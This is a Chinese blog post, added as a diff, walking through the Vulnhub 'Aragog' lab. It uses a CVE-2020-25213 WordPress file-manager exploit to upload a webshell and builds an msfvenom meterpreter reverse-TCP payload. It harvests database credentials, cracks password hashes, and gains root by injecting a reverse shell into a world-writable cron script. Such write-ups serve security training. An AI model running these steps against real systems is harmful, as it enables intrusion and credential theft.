@@ -1,0 +1,204 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Vulnhub系列-Aragog | Aesm1p&#39;s Blog | 前方如聂鲁达的爱情诗一般美好</title>
+
+  
+  <meta name="author" content="Aesm1p">
+  
+
+  
+  <meta name="description" content="相逢意气为君饮">
+  
+
+  
+  
+  <meta name="keywords" content="wordpress">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="Vulnhub系列-Aragog"/>
+
+  <meta property="og:site_name" content="Aesm1p&#39;s Blog"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Aesm1p&#39;s Blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Aesm1p&#39;s Blog</a>
+    </h1>
+    <p class="site-description">前方如聂鲁达的爱情诗一般美好</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">HOME</a></li>
+      
+        <li><a href="/archives">ARCHIVES</a></li>
+      
+        <li><a href="/tags">TAGS</a></li>
+      
+        <li><a href="/about">ABOUT</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>Vulnhub系列-Aragog</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/05/30/vulnhubAragog/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-05-30T00:00:00.000Z">
+          2021-05-30
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p><img src="/2021/05/30/vulnhubAragog/2.jpg" alt></p>
+<a id="more"></a>
+<h1 id="Aragog"><a href="#Aragog" class="headerlink" title="Aragog"></a>Aragog</h1><p>经过扫描IP地址为192.168.56.107</p>
+<p>然后进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sT -vv -O 192.168.56.107</span><br></pre></td></tr></table></figure>
+<p>还是开放了80和22端口，那么对80端口进行测试</p>
+<p>下一步进行目录爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /opt/dirsearch/dirsearch.py -u http://192.168.56.107/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e php,txt,html -f -t 40</span><br></pre></td></tr></table></figure>
+<p>进行爆破之后发现blog目录下存在wordpress博客，在kali下有一个wordpress工具wpscan，使用该工具进行扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.56.107/blog/ -t 20 --plugins-detection aggressive</span><br></pre></td></tr></table></figure>
+<p>扫描之后发现存在一个插件</p>
+<p><img src="/2021/05/30/vulnhubAragog/2.png" alt></p>
+<p>版本号为6.0，该插件存在CVE-2020-25213，github上有exp，利用该漏洞可以上传木马到后台getshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./wp-file-manager-exploit.sh -u http://192.168.56.107/blog -f /tmp/shell.php</span><br></pre></td></tr></table></figure>
+<p>这里-f参数需要使用绝对目录，否则会上传失败</p>
+<p>之后会返回URL，使用蚁剑连接该URL即可getshell</p>
+<p>查看/home/hagrid98可以得到第一段flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /home/hagrid98/horcrux1.txt</span><br><span class="line">horcrux_&#123;MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==&#125;</span><br></pre></td></tr></table></figure>
+<p>使用msf生成木马</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.56.108</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>然后我们生成木马上传到目标系统</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.56.108 LPORT=4444 -f raw &gt; msf.php</span><br></pre></td></tr></table></figure>
+<p>然后kali在kali上执行shell命令即可获得交互式shell</p>
+<p>查看进程发现有mysql进行，在wordpress配置文件中有mysql的用户名和密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/wordpress/config-default.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">define(<span class="string">'DB_NAME'</span>, <span class="string">'wordpress'</span>);</span><br><span class="line">define(<span class="string">'DB_USER'</span>, <span class="string">'root'</span>);</span><br><span class="line">define(<span class="string">'DB_PASSWORD'</span>, <span class="string">'mySecr3tPass'</span>);</span><br><span class="line">define(<span class="string">'DB_HOST'</span>, <span class="string">'localhost'</span>);</span><br><span class="line">define(<span class="string">'DB_COLLATE'</span>, <span class="string">'utf8_general_ci'</span>);</span><br><span class="line">define(<span class="string">'WP_CONTENT_DIR'</span>, <span class="string">'/usr/share/wordpress/wp-content'</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>连接mysql，查看是否有密码信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pmySecr3tPass -Dwordpress</span><br><span class="line">select * from wp_users;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/05/30/vulnhubAragog/3.png" alt></p>
+<p>在kali下使用hachcat时会报错，所以在windows下破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hashcat.exe -O -m 400 -a 0 -o cracked.txt .\hash.txt C:\Users\aesm1p\Desktop\rockyou.txt</span><br></pre></td></tr></table></figure>
+<p>很快就爆破出来了结果为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$P</span><span class="variable">$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc</span>.:password123</span><br></pre></td></tr></table></figure>
+<p>使用账户名密码进行ssh登录，得到第一段flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hagrid98@Aragog:~$ cat horcrux1.txt</span><br><span class="line">horcrux_&#123;MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==&#125;</span><br></pre></td></tr></table></figure>
+<p>在寻找信息之后没有找到合适的信息，有一款工具pspy可以用来监测系统中运行的不需要root权限的进程</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2021/05/29 11:04:01 CMD: UID=0 PID=7682 | /bin/sh -c bash -c <span class="string">"/opt/.backup.sh"</span></span><br></pre></td></tr></table></figure>
+<p>这个进程uid为0，每两分钟运行一次，而且这个文件任意用户均可读写，所以我们在这个文件中写入木马：</p>
+<p>kali中存在webshells，我们将该webshell补全参数后上传，然后监听等待反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>
+<p>编辑靶机上的.backup.sh文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">cp -r /usr/share/wordpress/wp-content/uploads/ /tmp/tmp_wp_uploads</span><br><span class="line">php /tmp/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
+<p>然后最多等待两分钟即可在kali上收到反弹的shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nc -lvvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">192.168.56.107: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.108] from (UNKNOWN) [192.168.56.107] 48774</span><br><span class="line">Linux Aragog 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux</span><br><span class="line"> 11:26:01 up 17:51,  1 user,  load average: 0.00, 0.02, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">hagrid98 pts/0    192.168.56.108   09:39   17.00s  0.15s  0.15s -bash</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">/bin/sh: 0: can't access tty; job control turned off</span><br><span class="line"><span class="meta">#</span><span class="bash"> id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/vulnhub/">vulnhub</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/wordpress/">wordpress</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 Aesm1p
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+</html>
